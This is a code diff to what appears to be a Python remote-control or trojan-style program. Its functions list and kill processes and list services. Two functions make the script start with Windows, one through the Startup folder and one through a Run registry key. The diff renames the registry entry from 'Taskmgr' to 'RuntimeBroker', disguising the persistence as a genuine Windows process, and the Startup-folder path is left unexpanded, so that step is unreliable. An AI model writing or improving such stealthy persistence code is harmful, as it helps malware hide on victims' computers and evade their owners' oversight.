@@ -42,10 +42,10 @@ def kill_all_processes_by_name(message):
         return f"Error: {e}"
 
 def processes(message):
-    split = message.split(" ")
-    params = len(split) == 2
-    finalstr = ""
     try:
+        split = message.split(" ")
+        params = len(split) == 2
+        finalstr = ""
         for proc in psutil.process_iter(['pid', 'name']):
             if not params or (params and split[1].lower() in proc.info['name'].lower()):
                 finalstr += f"PID: {proc.info['pid']}, Name: {proc.info['name']}\n"
@@ -87,17 +87,16 @@ def get_all_services_cmd(message):
         return f"Error: {e}"
 
 def add_to_startup_1():
-    response = "Add to startup failed"
     try:
         shutil.copy(__file__, f"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
         return "Add to startup folder Success"
     except Exception as e: return f"Error: {e}"
 
 def add_to_startup_2():
-    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
-    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
     try:
-        SetValueEx(key2change, "Taskmgr", 0, REG_SZ, __file__)
+        key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
+        SetValueEx(key2change, "RuntimeBroker", 0, REG_SZ, __file__)
     except Exception as e: return f"Error occured: {e}"
     return "Successfully added startup regkey"
 
